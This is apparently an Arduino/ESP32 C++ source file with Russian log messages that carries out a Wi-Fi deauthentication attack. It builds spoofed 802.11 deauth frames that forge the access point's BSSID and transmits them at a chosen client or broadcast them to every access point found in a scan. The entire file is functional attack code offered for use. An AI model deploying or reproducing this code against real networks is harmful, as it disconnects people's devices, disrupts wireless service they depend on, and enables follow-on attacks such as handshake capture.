// deauth_attack.cpp
#include "deauth_attack.h"
#include "utilities.h" // For parseMacAddress and macToString, will be created later
#include <Arduino.h>

// Definition of extern variables is expected in the main .ino file or a global context file.
// For now, we assume they are accessible.

void perform_sendDeauth() {
    uint8_t client_mac[6];
    uint8_t ap_bssid_to_spoof[6];
    bool client_mac_valid = parseMacAddress(deauthDetailedStats.targetMac.c_str(), client_mac);
    bool ap_bssid_valid = false;

    if (!client_mac_valid) {
        Serial.printf("DEAUTH ОШИБКА: Неверный формат MAC клиента: %s\n", deauthDetailedStats.targetMac.c_str());
        deauthDetailedStats.errors++;
        return;
    }

    if (!deauthDetailedStats.targetBssid.isEmpty()) {
        ap_bssid_valid = parseMacAddress(deauthDetailedStats.targetBssid.c_str(), ap_bssid_to_spoof);
        if (!ap_bssid_valid) {
            Serial.printf("DEAUTH ПРЕДУПРЕЖДЕНИЕ: Неверный формат BSSID цели (%s), будет выбран автоматически, если возможно.\n", deauthDetailedStats.targetBssid.c_str());
        }
    }
    
    if (!ap_bssid_valid) { 
        bool found_target_ap = false;
        // Check if a specific client is targeted and if we have a list of APs to pick from
        if (deauthDetailedStats.targetMac != "FF:FF:FF:FF:FF:FF" && !foundAPsList.empty()) {
            // Attempt to use the BSSID of the first AP in the scanned list if a specific client is targeted
            // This is a simple heuristic; a more advanced approach might try to find the AP the client is connected to.
            if (parseMacAddress(foundAPsList[0].bssid.c_str(), ap_bssid_to_spoof)) {
                ap_bssid_valid = true;
                Serial.printf("DEAUTH ИНФО: BSSID цели не указан или невалиден, используется BSSID первой AP из списка: %s\n", foundAPsList[0].bssid.c_str());
            }
        } else if (foundAPsList.empty() && deauthDetailedStats.targetMac != "FF:FF:FF:FF:FF:FF") {
             Serial.println("DEAUTH ПРЕДУПРЕЖДЕНИЕ: Список AP пуст, не могу автоматически выбрать BSSID для атаки на конкретного клиента.");
        }
    }

    // If targeting broadcast MAC and BSSID is still not valid (not provided and not auto-selected)
    // then iterate through all known APs from the scan list.
    if (!ap_bssid_valid && deauthDetailedStats.targetMac == "FF:FF:FF:FF:FF:FF"){
        Serial.println("DEAUTH ИНФО: Атака Deauth на broadcast MAC без указания BSSID. Будут атакованы все AP из списка сканирования.");
        if (foundAPsList.empty()) {
            Serial.println("DEAUTH ОШИБКА: Нет известных AP для атаки на broadcast.");
            deauthDetailedStats.errors++;
            return;
        }
        for (const auto& ap_info : foundAPsList) {
            if (parseMacAddress(ap_info.bssid.c_str(), ap_bssid_to_spoof)) {
                ieee80211_deauth_frame deauth_pkt;
                deauth_pkt.frame_control = htons(0xC000); // Type: Management (00), Subtype: Deauthentication (1100)
                deauth_pkt.duration_id = htons(0x013A); // Arbitrary duration
                memcpy(deauth_pkt.addr1, client_mac, 6); // DA = Client MAC (or broadcast)
                memcpy(deauth_pkt.addr2, ap_bssid_to_spoof, 6); // SA = AP BSSID (spoofed)
                memcpy(deauth_pkt.addr3, ap_bssid_to_spoof, 6); // BSSID = AP BSSID
                deauth_pkt.seq_ctrl = 0; // Sequence control
                deauth_pkt.reason_code = htons(0x0007); // Reason: Class 3 frame received from nonassociated STA

                esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &deauth_pkt, sizeof(ieee80211_deauth_frame), false);
                if (err == ESP_OK) { 
                    deauthDetailedStats.packetsSent++; 
                    totalPacketsSentGlobal++; 
                } else { 
                    deauthDetailedStats.errors++; 
                    Serial.printf("DEAUTH ОШИБКА отправки на %s: %s\n", ap_info.bssid.c_str(), esp_err_to_name(err));
                }
            }
        }
        return; // Finished broadcast deauth for all APs
    }

    // If after all checks, ap_bssid is still not valid, we cannot proceed with a targeted deauth.
    if (!ap_bssid_valid) {
        Serial.println("DEAUTH ОШИБКА: Не удалось определить BSSID цели. Атака не будет выполнена.");
        deauthDetailedStats.errors++;
        return; 
    }

    // Standard Deauth packet construction for a specific client and AP
    ieee80211_deauth_frame deauth_pkt;
    deauth_pkt.frame_control = htons(0xC000);   // Type: Management (00), Subtype: Deauthentication (1100)
    deauth_pkt.duration_id = htons(0x013A);     // Arbitrary duration
    memcpy(deauth_pkt.addr1, client_mac, 6);        // DA = Client MAC
    memcpy(deauth_pkt.addr2, ap_bssid_to_spoof, 6);  // SA = AP BSSID (spoofed)
    memcpy(deauth_pkt.addr3, ap_bssid_to_spoof, 6);  // BSSID = AP BSSID
    deauth_pkt.seq_ctrl = 0;        // Sequence control
    deauth_pkt.reason_code = htons(0x0007);    // Reason: Class 3 frame received from nonassociated STA

    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &deauth_pkt, sizeof(ieee80211_deauth_frame), false);

    if (err == ESP_OK) {
        deauthDetailedStats.packetsSent++;
        totalPacketsSentGlobal++;
    } else {
        deauthDetailedStats.errors++;
        Serial.printf("DEAUTH ОШИБКА отправки: %s\n", esp_err_to_name(err));
    }
}

